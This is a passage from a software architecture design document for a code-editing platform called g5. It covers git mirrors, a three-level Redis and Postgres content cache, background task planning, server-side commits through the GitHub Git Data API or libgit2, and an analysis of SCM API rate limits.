With `GitMirrorService` in place, the §12 CRDT seed flow becomes concrete:

```
Client opens file → seed request (y-ws message type 3)
    │
    ▼
CrdtAuthority::handle_seed_request(workspace_id, branch, file_path)
    │
    ├── Resolve repo_id from workspace_branch → workspace → repos
    ├── Resolve head_commit from workspace_branches table
    │
    ▼
mirror_service.show_file(repo_id, head_commit, file_path)
    │
    ├── ensure_mirror(repo_id) → /var/lib/g5/mirrors/{repo_id}.git
    ├── git show {head_commit}:{file_path}
    │
    ▼
content bytes → insert into Y.Doc Y.Text(file_path)
    │
    ▼
Y.Doc update auto-broadcasts to all connected clients
```

### 13.7 Deployment Considerations

| Deployment | Mirror Storage | Notes |
|------------|---------------|-------|
| SaaS (single pod) | Local SSD `/var/lib/g5/mirrors/` | Simple. Survives pod restart if on persistent volume. |
| SaaS (multi-pod) | Shared NFS / EFS / Filestore mount | All pods read from same mirrors. One pod handles webhooks + fetches. |
| SaaS (multi-pod, no shared FS) | Per-pod local + eventual consistency | Each pod maintains its own mirror set. Webhooks fan out to all pods. Mirrors may be slightly stale. |
| Self-hosted | Local disk `~/.g5/mirrors/` | Single machine. Fast. |
| Air-gapped | Local disk, manual sync | `g5 mirror sync` CLI command to update from USB/tar. |

**Multi-pod concern**: If g5-api scales horizontally, either all pods share a filesystem (NFS), or each pod maintains independent mirrors. Independent mirrors mean:
- Redundant disk usage (N copies × repo size)
- Possible stale reads (pod X fetched 30s ago, pod Y fetched 5min ago)
- Webhook must hit all pods (or a shared message bus distributes fetch notifications)

**Recommendation for SaaS**: Shared persistent filesystem (GCS FUSE / EFS / Filestore) mounted at `/var/lib/g5/mirrors/`. One "fetcher" process handles webhooks and git fetch. All API pods read from the shared bare mirrors. This is the standard pattern used by GitLab Gitaly.

For the cloud-agnostic model from §8, this maps to the `ObjectStoreBackend` trait — but bare repos are **not** object-store-friendly (they're directory trees, not single blobs). Options:
1. Shared filesystem (NFS/EFS/Filestore) — simplest, works everywhere
2. Per-pod mirrors with fetch-on-demand — no shared FS needed, but more disk and possible stale reads
3. Git protocol proxy (like Gitaly) — most sophisticated, least portable

**Recommendation**: Option 1 (shared FS) for SaaS, Option 2 (per-pod) for self-hosted.

### 13.8 Required Spec Changes

| # | Spec File | Change |
|---|-----------|--------|
| 1 | **NEW**: `g5/g5-api/services/git_mirror_service.semlift.md` | `GitMirrorService` struct, `ensure_mirror()`, `fetch()`, `show_file()`, `ls_tree()`, `handle_webhook()`. Core git access layer for g5-api. |
| 2 | **NEW**: `g5/g5-api/routes/webhooks.semlift.md` | `POST /api/v1/webhooks/:provider` — SCM webhook handler. Validates signature, triggers mirror fetch, emits branch.updated events. |
| 3 | `g5/g5-api/config.semlift.md` | Add `mirror_dir: PathBuf` (default `/var/lib/g5/mirrors`), `mirror_fetch_interval_secs: u64` (default 300), `mirror_max_size_bytes: u64` per repo. |
| 4 | `g5/g5-api/routes/files.semlift.md` | Replace "git utility layer" handwave with `GitMirrorService::show_file()` and `GitMirrorService::ls_tree()`. Remove "editor connected" delegation path for MVP — mirrors are the canonical source. |
| 5 | `g5/g5-api/services/draft_service.semlift.md` | `commit_draft()` step "Git operations" → use `GitMirrorService` temporary worktree pattern. |
| 6 | `g5/g5-api/services/search_service.semlift.md` | "Read git tree" → delegates to `GitMirrorService::ls_tree()` + `show_file()`. |
| 7 | `g5/g5-api/crdt/authority.semlift.md` | `handle_seed_request()` reads content from `GitMirrorService::show_file()`. |
| 8 | `g5/g5-api/services/ontology_service.semlift.md` | Content retrieval → delegates to `GitMirrorService::show_file()`. |
| 9 | Root spec (`g5.semlift.md`) §3.2 | Clarify: "g5-api reads from its bare mirror (§13)" instead of vague "its own git checkout." |
| 10 | `g5/g5-api/app_state.semlift.md` | Add `git_mirror: Arc<GitMirrorService>` to `AppState`. |

### 13.9 Open Questions

36. **Should mirrors be bare clones or full clones?** Bare clones save disk (~30% smaller, no working tree) and are safe against accidental modification. Full clones allow `git diff` with working tree semantics. All g5-api operations work with bare repos except draft commit, which uses a temporary worktree. **Recommendation: bare clones.**

37. **Who cleans up stale mirrors?** When a repo is removed from all workspaces, its mirror is orphaned. A background GC task should scan `repos` table, find mirrors with no active workspace references, and delete them after a grace period (7 days). **Recommendation: weekly GC job.**

38. **Mirror size limits?** Large monorepos (Linux kernel: 4GB `.git`) could exhaust disk. Should there be a per-repo size limit? **Recommendation: configurable `max_mirror_size_bytes` (default 10GB). `git clone --bare` fails if the remote exceeds this. Users with larger repos must increase the limit or use shallow mirrors.**

39. **Shallow mirrors vs. full mirrors?** `git clone --bare --depth=1` creates a shallow mirror that saves disk but can't serve `git log`, `git blame`, or diffs against old commits. Full bare mirrors support all operations. **Recommendation: full mirrors by default. Shallow mode as an opt-in for very large repos where log/blame aren't needed.**

40. **Should the mirror be per-repo or per-workspace-branch?** Per-repo means one mirror serves all branches of that repo across all workspaces. This is simpler and more space-efficient. Per-branch would waste disk duplicating most objects. **Recommendation: per-repo. `git show {commit}:{path}` works for any commit regardless of which branch it's on.**

41. **Initial mirror creation blocks the first API request.** Cloning a large repo can take 30-60s. Should `ensure_mirror()` block or return immediately and clone in the background? **Recommendation: hybrid. If the mirror doesn't exist, return 202 Accepted with a Location header pointing to a status endpoint. The client polls or subscribes to a WS event. For small repos (<100MB), inline clone is fast enough to block.** Alternative: pre-warm mirrors at workspace creation time (async job triggered by `create_workspace`).

---

### §13.10 — Correction: The Mirror Is the Wrong Layer for UI Latency

#### The Problem With §13.5 As Written

§13.5 proposes bare mirrors as the serving layer for file tree and file content. But:

1. **Bare mirrors can be huge.** Average repo: 50-500MB. Large monorepo: 1-10GB. 500 repos = 25-250GB of mirrors. On cloud NFS (EFS at $0.30/GB) that's $7-75/month in storage. On SSD, it's faster but more expensive.
2. **NFS `git show` is slow.** Shared-filesystem mirrors (§13.7's multi-pod recommendation) put NFS in the read path. `git show` on NFS: 50-200ms per file operation. The spec requires `< 500ms for ontology tree initial load` (§5.1). A tree with 50 files hit serially at 100ms each = 5 seconds — 10× over budget.
3. **Mirrors are cold-start-hostile.** First access to a new repo requires a full bare clone. 30-60s for large repos. The UI just shows a spinner.

The bare mirror is the right **backend** for bulk operations (search indexing, blame, diff), but it's the wrong **serving layer** for interactive UI reads.

#### Key Insight: Git Content Is Immutable and Cacheable

`git show {commit_sha}:{path}` returns the same bytes forever. The commit SHA is a content hash — the result is deterministic. This means:

- Cache key: `{commit_sha}:{path}` → content bytes
- TTL: **infinite** (immutable data never expires)
- Invalidation: **never** (old commits don't change; new commits get new keys)

Similarly, `git ls-tree {commit_sha}:{path}` is immutable by the same argument.

#### Second Insight: §12's Y.Doc IS the Steady-State Cache

From §12, when a user opens a file:
1. CRDT seed request fires
2. Server calls `git show` to get the base content
3. Content inserted into `Y.Text(file_path)` in the branch's Y.Doc
4. All subsequent reads — by this user, other users, API clients — read from Y.Doc memory

The `git show` is only hit **once per file per branch-head**. After that, the Y.Doc is the cache. If the user opens 20 files in a session, that's 20 `git show` calls, ever. Everything after that is a Y.Doc memory read (<1ms).

The file tree is similarly load-once: `git ls-tree` is called once when the sidebar opens, cached, and only re-fetched when HEAD advances (push webhook).

#### Revised Architecture: Content Cache in Front, Mirror Behind

```
┌─────────────┐
│  Browser     │ ← WebSocket (CRDT) or REST
└──────┬───────┘
       │
       ▼
┌──────────────────────────────────────────────┐
│  g5-api                                      │
│                                              │
│  ┌────────────────────────┐                  │
│  │   Y.Doc (per branch)   │ ← STEADY STATE  │
│  │   File content lives   │   After seed,    │
│  │   here in memory       │   all reads      │
│  └────────┬───────────────┘   come from here │
│           │ (seed miss)                      │
│           ▼                                  │
│  ┌────────────────────────┐                  │
│  │   ContentCache (Redis) │ ← L2 CACHE      │
│  │   Key: {sha}:{path}   │   Shared across  │
│  │   Key: tree:{sha}:{p} │   all pods       │
│  │   TTL: ∞ (immutable)  │   LRU eviction   │
│  └────────┬───────────────┘   by memory cap  │
│           │ (cache miss)                     │
│           ▼                                  │
│  ┌────────────────────────┐                  │
│  │   GitMirrorService     │ ← L3 BACKEND    │
│  │   Bare repo on disk    │   Or: SCM API   │
│  │   git show / ls-tree   │   (GitHub/GL)   │
│  └────────────────────────┘                  │
└──────────────────────────────────────────────┘
```

**Three-level read path:**

| Level | What | Latency | Storage | When |
|-------|------|---------|---------|------|
| **L1: Y.Doc** | In-process Yjs document | < 1ms | RAM (~100KB-10MB per branch) | After first file open in a draft |
| **L2: Redis** | Content-addressed cache | 1-5ms | Redis memory (shared, capped) | After first `git show` for a commit, before Y.Doc seed |
| **L3: Backend** | Bare mirror OR SCM API | 5ms (local SSD) / 100-300ms (SCM API) | Disk or none | True cold miss — never-seen commit |

#### L2 Cache: Redis Content Store

```rust
pub struct ContentCache {
    redis: deadpool_redis::Pool,
    /// Max bytes per cached blob (skip caching large binaries)
    max_blob_size: usize, // default 10MB
}

impl ContentCache {
    /// Cache key: "blob:{commit_sha}:{path_hash}"
    /// Value: raw bytes (or RESP blob)
    /// TTL: none (immutable), evicted by Redis maxmemory-policy allkeys-lru
    pub async fn get_file(&self, commit: &str, path: &str) -> Option<Vec<u8>> { ... }
    pub async fn put_file(&self, commit: &str, path: &str, content: &[u8]) { ... }

    /// Cache key: "tree:{commit_sha}:{path_hash}"
    /// Value: JSON-serialized Vec<TreeEntry>
    pub async fn get_tree(&self, commit: &str, path: &str) -> Option<Vec<TreeEntry>> { ... }
    pub async fn put_tree(&self, commit: &str, path: &str, entries: &[TreeEntry]) { ... }
}
```

Redis is already in the stack (job queues, pub/sub). Adding content caching is a config change, not new infrastructure. Set `maxmemory` (e.g., 2GB) and `maxmemory-policy allkeys-lru` — Redis auto-evicts least-recently-used entries when the cap is hit. Immutable data re-fetches are cheap.

**Cache sizing**: Active workspace with 5,000 files, average 5KB each = 25MB. 100 active workspaces = 2.5GB. Fits comfortably in a 4GB Redis with room for job queues and other state.

#### L3 Backend: Mirror vs. SCM API (Deployment-Dependent)

The L3 backend is pluggable:

| Deployment | L3 Backend | Why |
|------------|-----------|-----|
| **SaaS** | **SCM API** (GitHub/GitLab REST) | Zero storage. Pay latency on cache miss only (~200ms). Rate limits manageable with caching (5000 req/hr GitHub ≫ cache-miss rate). |
| **Self-hosted** | **Bare mirror** (local SSD) | Low latency (5ms). Mirrors live on the same machine. No API rate limits. |
| **Air-gapped** | **Bare mirror** (local SSD) | Only option — no internet for SCM API. |
| **SaaS (heavy, >100 repos)** | **Bare mirror** (shared FS) | SCM API rate limits become a concern at scale. Mirrors provide guaranteed low-latency L3. |

For SaaS with a small number of repos (the common MVP case), the **SCM API backend eliminates mirror storage entirely**. The read path is:

```
L1 miss (no Y.Doc yet) → L2 miss (never fetched this commit) →
GitHub API: GET /repos/{owner}/{repo}/contents/{path}?ref={sha} →
Cache in Redis (L2) → Seed into Y.Doc (L1) → Done.
```

Bare mirrors only become necessary for:
- Bulk operations (search indexer needs to walk entire tree — calling the SCM API for 10,000 files would exhaust rate limits)
- `git blame` (GitHub has a blame API, but it's slow and paginated)
- `git log` (GitHub has a commits API, sufficient for most cases)
- Draft commit (needs worktree — but can use a temporary shallow clone instead of a persistent mirror)
- Air-gapped deployments (no internet)

**This means for SaaS MVP: no mirrors at all for the UI path. Just Redis cache + SCM API.**

#### File Tree: Materialized in Postgres

For the file tree specifically, there's an even better option: **materialize the tree in Postgres on each push**. The webhook handler already knows when HEAD changes. At that point:

1. Fetch the new tree (one `git ls-tree -r` against mirror, or one GitHub Tree API call)
2. Upsert into a `file_tree_entries` table: `(repo_id, commit_sha, path, type, size, blob_sha)`
3. File tree API reads from Postgres instead of git

Benefits:
- File tree loads are a single indexed Postgres query (< 10ms for 10K files)
- No git dependency on the hot path
- Tree is consistent across all pods (Postgres is the source of truth)
- Supports search/filter natively (SQL `WHERE path LIKE 'src/%'`)

This is what GitHub itself does — the file tree you see on github.com comes from a database, not live `git ls-tree`.

#### Revised Read Flow: Complete Path for "User Opens a File"

```
1. User opens workspace in browser
   │
2. Sidebar loads → GET /api/v1/repos/{id}/tree?ref=main
   │
   ├── Postgres lookup: file_tree_entries WHERE repo_id = X AND commit = HEAD
   │   └── Returns: [{path: "src/main.rs", type: "blob", size: 1234}, ...]
   │   └── Latency: < 10ms (indexed query)
   │
3. User clicks "src/main.rs" → CRDT seed request (y-ws)
   │
   ├── L1: Y.Doc check → not seeded yet
   ├── L2: Redis check → GET "blob:{head_sha}:src/main.rs"
   │   ├── HIT → content bytes → seed Y.Doc → broadcast → done (< 5ms)
   │   └── MISS →
   │       ├── [SaaS] GitHub API: GET /repos/o/r/contents/src/main.rs?ref={sha}
   │       │   └── 200 OK, content bytes → Redis PUT → seed Y.Doc (200ms)
   │       └── [Self-hosted] git show {sha}:src/main.rs on bare mirror
   │           └── content bytes → Redis PUT → seed Y.Doc (5ms)
   │
4. Content appears in editor (Monaco via CRDT)
   │
5. User clicks "src/lib.rs" → same flow, but this time L2 likely hits
   │  (if someone else opened it, or a prefetch loaded it)
   │
6. All subsequent reads of "src/main.rs": L1 hit (Y.Doc, < 1ms)
```

**Worst case (complete cold miss, SaaS):** ~200ms for the first file. Every subsequent file open for the same commit: <5ms (Redis hit). After seed: <1ms (Y.Doc).

**Typical case (warm Redis, SaaS):** <5ms for every file open (Redis). After seed: <1ms.

**Self-hosted:** <5ms for everything (local bare mirror + Redis on localhost).

#### Prefetch Strategy

To eliminate even the cold-miss latency for the first file, g5-api can **prefetch** common files into Redis when HEAD advances:

```
Webhook: push event for repo X, new HEAD = abc123
  │
  ├── Update file_tree_entries in Postgres
  ├── Identify "hot files" (files currently open in any Y.Doc for this repo)
  ├── For each hot file: git show abc123:{path} → Redis PUT
  └── Emit branch.updated → clients refresh tree + re-seed changed files
```

This means when a user is editing `main.rs` and someone pushes a new commit, the new content is already in Redis before the client asks for it.

### §13.11 Summary: What Actually Needs a Bare Mirror

| Operation | Needs Bare Mirror? | Alternative |
|-----------|-------------------|-------------|
| File content (single file) | No | Redis cache + SCM API |
| File tree | No | Postgres materialized tree |
| CRDT seed | No | Redis cache + SCM API |
| Search indexer (bulk) | **Yes** (or temp clone) | Temp shallow clone, discard after index |
| git blame | **Yes** (or SCM API) | GitHub/GitLab blame API (slow but works) |
| git log | No | SCM commits API |
| git diff (two commits) | **Yes** | SCM compare API |
| Draft commit | **Temp worktree** | Temp shallow clone, push, discard |

**For SaaS MVP**: No persistent bare mirrors. Redis content cache + SCM API + Postgres file tree. Temporary shallow clones for search indexing and draft commit.

**For self-hosted / air-gapped / scale**: Bare mirrors on local SSD. Still use Redis cache in front for multi-pod consistency and latency.

### §13.12 Revised Spec Changes (Supersedes §13.8)

| # | Spec File | Change |
|---|-----------|--------|
| 1 | **NEW**: `g5/g5-api/services/content_cache.semlift.md` | `ContentCache` — Redis-backed content-addressed cache. `get_file(commit, path)`, `put_file(commit, path, content)`, `get_tree(commit, path)`, `put_tree(commit, path, entries)`. Core caching layer used by all consumers. |
| 2 | **NEW**: `g5/g5-api/services/git_content_service.semlift.md` | `GitContentService` — unified read interface. `show_file(repo_id, commit, path)` and `ls_tree(repo_id, commit, path)` with L1→L2→L3 resolution. Pluggable L3 backend: `ScmApiBackend` (SaaS) or `BareRepoBackend` (self-hosted). |
| 3 | **NEW**: `g5/g5-api/routes/webhooks.semlift.md` | `POST /api/v1/webhooks/:provider` — Webhook handler. Validates signature, updates file_tree_entries in Postgres, prefetches hot files into Redis, emits branch.updated events. |
| 4 | `g5/g5-api/routes/files.semlift.md` | File tree reads from `file_tree_entries` Postgres table. File content reads from `GitContentService`. No direct git access. |
| 5 | `g5/g5-api/crdt/authority.semlift.md` | `handle_seed_request()` reads via `GitContentService.show_file()`. |
| 6 | `g5/g5-api/services/search_service.semlift.md` | Indexer reads via `GitContentService` (bulk mode: bypasses Redis, reads from mirror or temp clone). |
| 7 | `g5/g5-api/config.semlift.md` | Add `content_cache_max_mb: u64` (Redis cap), `git_backend: "scm_api" | "bare_mirror"`, `mirror_dir: Option<PathBuf>`. |
| 8 | Root spec §3.2 | Replace "g5-api reads from its own git checkout" with "g5-api reads file content via a content-addressed cache (Redis) backed by the SCM API or a local bare mirror." |
| 9 | Schema migration | `file_tree_entries` table: `(repo_id UUID, commit_sha TEXT, path TEXT, entry_type TEXT, size BIGINT, blob_sha TEXT, PRIMARY KEY (repo_id, commit_sha, path))`. Index on `(repo_id, commit_sha)` for full-tree queries. |
| 10 | `g5/g5-api/app_state.semlift.md` | Add `content_cache: Arc<ContentCache>`, `git_content: Arc<GitContentService>` to `AppState`. |

### §13.13 Open Questions (Revised)

42. **Redis vs. in-process LRU for L2?** Redis adds a network hop (1-5ms) but is shared across pods. An in-process `moka` or `mini-moka` cache could serve as L1.5 (< 0.1ms) with Redis as L2. The double-cache adds complexity but eliminates Redis latency for hot files. **Recommendation: in-process LRU (100MB cap) + Redis. Two lines of read logic, massive latency improvement for active files.**

43. **`file_tree_entries` table size?** A 10,000-file repo needs 10K rows per commit. If we track the last 10 commits, that's 100K rows per repo. 500 repos = 50M rows. This is fine for Postgres with proper indexing, but consider partitioning by `repo_id` or pruning old commits. **Recommendation: keep only the latest commit per branch. `UPSERT ON CONFLICT (repo_id, commit_sha, path)`. Prune entries for commits no longer referenced by any branch.**

44. **SCM API rate limits at scale?** GitHub allows 5000 requests/hour per token. With aggressive caching, a workspace with 500 files would burn ~500 API calls on the first load of a new commit. If 10 workspaces push simultaneously, that's 5000 calls — hitting the limit. **Recommendation: for SaaS at scale (>50 active repos), switch L3 to bare mirrors. The `git_backend` config flag controls this. SCM API is the simple MVP path; mirrors are the scale path.**

45. **Should the client prefetch file content?** The sidebar knows which files exist. Should it eagerly request content for visible files (eager seed) or wait for the user to click (lazy seed, §12's recommendation)? **Recommendation: lazy seed for content, but eager prefetch for the first 2 levels of the tree (sidebar-visible directories).** This matches VS Code's own behavior — it lazy-loads file content but eagerly loads the tree.

---

## §14 — Background Tasks, Async Processing, and the JS Commit Question

### 14.1 The Problem: Who Does the Work?

§12 and §13 define a content model where the happy path (user clicks file → content appears) is low-latency and cache-friendly. But behind that path are a dozen asynchronous tasks that must run *somewhere*:

- CRDT compaction
- Search indexing
- File tree materialization on push
- Draft commit flush (Y.Doc → git commit → push)
- Stale draft cleanup
- Usage aggregation
- Invitation GC
- Timeline pruning
- Mirror management (if using bare mirrors)
- Cache warming / prefetch
- Webhook processing
- Worker scaling

The specs already answer *some* of this — `MaintenanceRunner` in g5-api spawns six `tokio::spawn` loop tasks. But §12-§13 introduce new async work that doesn't fit cleanly into the existing model, and the "draft commit flush" is architecturally interesting because it's the one operation that touches git write operations.

### 14.2 Complete Inventory of Async Tasks

| # | Task | Trigger | Frequency | Latency Requirement | Current Spec Location | Status |
|---|------|---------|-----------|--------------------|-----------------------|--------|
| 1 | **CRDT compaction** | Timer (5min) or threshold (50 updates) | Low (minutes) | None — background | `maintenance/crdt_compaction.semlift.md` | ✅ Specced |
| 2 | **Draft cleanup** | Timer (1hr) | Low | None | `maintenance/draft_cleanup.semlift.md` | ✅ Specced |
| 3 | **Search indexing** | Queue (`search_reindex_queue` table) | Medium — after every commit/push | < 30s to searchable | `maintenance/search_indexer.semlift.md` | ✅ Specced |
| 4 | **Usage aggregation** | Timer | Low (hourly) | None | `maintenance/usage_aggregation.semlift.md` | ✅ Specced |
| 5 | **Invitation GC** | Timer | Low (daily) | None | `maintenance/invitation_gc.semlift.md` | ✅ Specced |
| 6 | **Timeline cleanup** | Timer | Low (daily) | None | `maintenance/timeline_cleanup.semlift.md` | ✅ Specced |
| 7 | **Task scheduler** | 500ms tick + event-driven | Continuous | < 1s task assignment | `scheduler.semlift.md` | ✅ Specced |
| 8 | **Worker scaler** | 5s tick | Continuous | < 30s scale reaction | `scheduler/scaling.semlift.md` | ✅ Specced |
| 9 | **Webhook handler** | HTTP POST from SCM | On push (bursty) | < 5s to process | **§13 — NEW, not specced** | ❌ Gap |
| 10 | **File tree materialization** | After webhook/push | On push | < 10s to UI refresh | **§13 — NEW, not specced** | ❌ Gap |
| 11 | **Content cache warming** | After webhook/push | On push | < 10s for hot files | **§13 — NEW, not specced** | ❌ Gap |
| 12 | **Draft commit flush** | User clicks "Commit" | On demand | < 10s to committed | **§12/§13 — NEW, not specced** | ❌ Gap |
| 13 | **Mirror fetch** (if using mirrors) | After webhook | On push | < 30s | **§13 — optional, not specced** | ❌ Gap |
| 14 | **Mirror GC** | Timer (weekly) | Low | None | **§13 — optional, not specced** | ❌ Gap |
| 15 | **Stale cache eviction** | Timer or Redis LRU | Continuous | None | Handled by Redis `maxmemory-policy` | ✅ Implicit |
| 16 | **Branch head tracking** | Webhook or periodic poll | On push or 5min poll | < 30s | Root spec §3.2 ("tracking" branches) | ⚠️ Partial |

**Summary**: 8 tasks fully specced (items 1-8), 6 new gaps (items 9-14), 2 implicit/partial (items 15-16).

### 14.3 Do We Need a Separate g5-jobs Process?

**No.** Here's why:

The existing model is: all background tasks run as `tokio::spawn` loops inside the g5-api process. The `MaintenanceRunner` already manages 6 tasks + the scheduler manages 2 more. Adding 6 more tasks to the same process is trivial — they're all lightweight Tokio tasks sharing the same connection pools.

**Arguments against a separate process:**

1. **Operational complexity.** A separate `g5-jobs` binary means a second deployment, second health check, second scaling policy, second set of env vars. For 6 background tasks that each run a SQL query every few minutes, this is massive overkill.
2. **Shared state.** Tasks like "webhook → file tree materialization → cache warming → SSE notification" form a pipeline within one request context. Splitting across processes adds Redis/queue latency between each step.
3. **The tasks are tiny.** CRDT compaction: merge some bytes in Postgres. Search indexing: insert rows. File tree materialization: one API call + one Postgres upsert. None of these need more than a few MB of RAM or a few seconds of CPU.

**Arguments for a separate process:**

1. **Isolation.** A runaway background task (e.g., search indexer hits a huge repo) can't starve HTTP request handlers of CPU/connections.
2. **Scaling independently.** If webhooks spike, you'd want to scale the webhook processor, not the entire API.

**Recommendation:** Keep everything in g5-api for MVP. Use Tokio's `spawn_blocking` for CPU-bound work (CRDT merge, git operations). If a specific task becomes a bottleneck at scale, extract it then. This is easy because each task is already an independent async function — moving it to a separate binary is a deployment change, not a code change.

**The one exception**: If we use bare mirrors, `git fetch` is blocking I/O that can take 10-60s. This should use `spawn_blocking` with a bounded semaphore (max 4 concurrent fetches) to prevent starving the Tokio runtime.

### 14.4 The JS Commit Question — You Don't Need a Checkout At All

Your intuition is right — the draft commit flush doesn't need a full checkout, and it doesn't even need a bare repo. Here's why:

#### Option A: SCM Git Data API (Zero Disk, Zero Git Binary)

GitHub, GitLab, and Bitbucket all expose a "Git Data" API that lets you create commits programmatically by constructing git objects directly:

**GitHub flow (4 API calls per commit):**
```
1. POST /repos/{owner}/{repo}/git/blobs
   Body: { "content": "<base64>", "encoding": "base64" }
   → Returns: { "sha": "abc123" }          (one per dirty file)

2. POST /repos/{owner}/{repo}/git/trees
   Body: {
     "base_tree": "<parent_tree_sha>",
     "tree": [
       { "path": "src/main.rs", "mode": "100644", "sha": "abc123" },
       { "path": "src/lib.rs",  "mode": "100644", "sha": "def456" }
     ]
   }
   → Returns: { "sha": "tree789" }

3. POST /repos/{owner}/{repo}/git/commits
   Body: {
     "message": "Draft commit: update main.rs, lib.rs",
     "tree": "tree789",
     "parents": ["<head_commit_sha>"],
     "author": { "name": "...", "email": "...", "date": "..." }
   }
   → Returns: { "sha": "newcommit" }

4. PATCH /repos/{owner}/{repo}/git/refs/heads/{branch}
   Body: { "sha": "newcommit" }
   → Branch updated
```

**Total: N+3 API calls** (N dirty files for blob creation + 1 tree + 1 commit + 1 ref update). For a typical draft with 5 dirty files: **8 API calls**. Tiny.

**GitLab equivalent:** Same concept via `/projects/:id/repository/commits` (a single API call that accepts all file changes at once — even simpler).

**Advantages:**
- Zero disk usage on g5-api
- Zero git binary dependency
- Works from any environment (Rust, JS, Lambda, etc.)
- No checkout, no worktree, no bare repo
- Atomic from the SCM's perspective (the ref update is atomic)

**Disadvantages:**
- Requires SCM API credentials with write access (we already have these — `user_scm_connections` table)
- Rate-limited (but a commit is only 8 calls — well within budget)
- Doesn't work for self-hosted generic git (no REST API)
- GitHub secondary rate limit: 80 content-generating requests/minute. With 8 calls per commit, that's ~10 commits/minute per user. Fine for interactive use.

#### Option B: libgit2 Object Construction on Bare Repo (No Working Tree)

If we have a bare mirror (self-hosted scenario), `git2` (libgit2 bindings) can create commit objects directly in the bare repo without needing a working tree:

```rust
// Open bare repo
let repo = git2::Repository::open_bare(&mirror_path)?;

// For each dirty file, create a blob
let blob_oid = repo.blob(file_content)?;

// Build the new tree by modifying the parent tree
let parent_commit = repo.find_commit(parent_oid)?;
let parent_tree = parent_commit.tree()?;
let mut tree_builder = repo.treebuilder(Some(&parent_tree))?;
tree_builder.insert("src/main.rs", blob_oid, 0o100644)?;
let new_tree_oid = tree_builder.write()?;
let new_tree = repo.find_tree(new_tree_oid)?;

// Create the commit
let signature = git2::Signature::now("User", "user@example.com")?;
let new_commit_oid = repo.commit(
    None, // don't update any ref yet
    &signature, &signature,
    "Draft commit: update main.rs",
    &new_tree,
    &[&parent_commit],
)?;

// Push to remote
// ... (git2 push with credentials)
```

Zero working tree. The bare repo's object database is used directly. This is exactly how `git commit-tree` works under the hood.

**Advantages:**
- Works for any git remote (including self-hosted)
- No working tree needed
- Fast (< 1s for typical draft)
- No SCM API dependency

**Disadvantages:**
- Requires a bare mirror to exist (disk cost)
- `git2` push is sometimes flaky — may want to shell out to `git push`

#### Option C: Does It Make Sense to Do This From JS?

You asked about doing the commit from JS. Let's evaluate:

**`isomorphic-git` (JS, runs in Node or browser):**
- Can create blobs, trees, commits without a working tree
- Can push via HTTP (smart HTTP protocol)
- **Could theoretically run in the browser** using the SCM API approach (but would need user's OAuth token in the browser — security concern)
- In Node on the server: works, but why? g5-api is Rust. Adding a Node sidecar for one operation is unjustifiable.

**The real question:** Is there an advantage to having the *browser* drive the commit? 

**No.** The browser has the Y.Doc content, but:
1. The browser doesn't have SCM credentials (and shouldn't — OAuth tokens are httpOnly cookies, not accessible to JS)
2. The browser would need to construct git objects, which requires knowing the parent tree SHA and the full tree structure (not just dirty files)
3. If the browser crashes mid-commit, the state is inconsistent
4. The server already has everything it needs: the Y.Doc (in-memory), the head commit SHA (in Postgres), the SCM credentials (encrypted in Postgres)

**Verdict:** The commit flush should be server-side. The browser sends `POST /api/v1/drafts/:id/commit` and the server handles everything.

#### Recommended Architecture: Server-Side, SCM API First

```
Browser                     g5-api                         GitHub/GitLab
  │                           │                               │
  │ POST /drafts/:id/commit   │                               │
  │ { message, author }       │                               │
  │──────────────────────────►│                               │
  │                           │                               │
  │                           │ 1. Read dirty files from Y.Doc│
  │                           │ 2. For each dirty file:       │
  │                           │    POST /git/blobs            │
  │                           │───────────────────────────────►│
  │                           │    ◄── blob SHA               │
  │                           │                               │
  │                           │ 3. POST /git/trees            │
  │                           │───────────────────────────────►│
  │                           │    ◄── tree SHA               │
  │                           │                               │
  │                           │ 4. POST /git/commits          │
  │                           │───────────────────────────────►│
  │                           │    ◄── commit SHA             │
  │                           │                               │
  │                           │ 5. PATCH /git/refs            │
  │                           │───────────────────────────────►│
  │                           │    ◄── 200 OK                 │
  │                           │                               │
  │                           │ 6. Update workspace_branches  │
  │                           │    .head_commit = new_sha     │
  │                           │ 7. Reset draft overlay        │
  │                           │ 8. Emit branch.updated event  │
  │                           │                               │
  │ ◄── 200 { commit_sha }   │                               │
  │                           │                               │
  │ ◄── WS: branch.updated   │                               │
```

**Fallback chain:**
1. **SaaS (GitHub/GitLab/Bitbucket):** SCM Git Data API — zero disk, zero git binary
2. **Self-hosted with bare mirror:** `git2` object construction on bare repo + `git push`
3. **Self-hosted without mirror:** Temp shallow clone → write files → commit → push → delete

### 14.5 SCM API Rate Limit Analysis

This is a real concern. Let me quantify it for each operation g5-api performs:

#### GitHub Rate Limits

| Limit Type | Budget | Applies To |
|-----------|--------|-----------|
| **Primary** | 5,000 req/hr per OAuth token (15,000 for GitHub Enterprise) | All REST calls |
| **Secondary** | 80 content-creating req/min | POST/PATCH calls that create content |
| **Secondary** | 900 points/min (GET=1pt, POST/PATCH=5pt) | All calls weighted |
| **Concurrent** | 100 simultaneous requests | All calls |

#### Per-Operation SCM API Cost

| Operation | API Calls | Type | When |
|-----------|-----------|------|------|
| **File content** (single file) | 1 GET | Read | User opens file (L3 miss) |
| **File tree** (directory) | 1 GET | Read | Sidebar expand (L3 miss) |
| **Full tree** (recursive) | 1 GET | Read | New commit tree materialization |
| **Draft commit** (5 dirty files) | 8 POST/PATCH | Write | User clicks Commit |
| **Git log** (branch) | 1 GET | Read | History view |
| **Git diff** (two commits) | 1 GET | Read | Diff view |

#### Budget Analysis: Typical Usage Scenario

**Setup:** 1 user, 1 workspace, 1 repo with 500 files.

| Activity | API Calls | Frequency | Hourly Total |
|----------|-----------|-----------|--------------|
| First file tree load (new commit) | 1 | Once per push | ~5 |
| File opens (L3 miss — first open per commit) | ~20 | Per push cycle | ~100 |
| Draft commits | 8 per commit | ~5 commits/day | ~40 |
| Diff views | 1 per view | ~20/day | ~20 |
| **Total per user** | | | **~165 req/hr** |

At 5,000 req/hr budget: supports **~30 concurrent active users** per OAuth token before hitting primary limits.

**But**: with the Redis cache (§13.10), file content and tree reads are only on L3 miss (first access per commit). A user who opens 20 files but they're all already cached: **0 API calls**. Realistically, after warmup, the hourly API cost per active user drops to ~20-30 req/hr (just commits + occasional cache misses). That's **150+ concurrent users** per token.

#### The Real Risk: Bursts, Not Steady-State

The danger is burst scenarios:
- **10 workspaces push simultaneously** → 10 × full tree fetch → 10 API calls (fine)
- **Search indexer re-indexes on push** → Needs to read every file in the tree. 500 files = 500 API calls in one burst. This is why §13.11 says the search indexer should use bare mirrors or temp clones, NOT the SCM API.
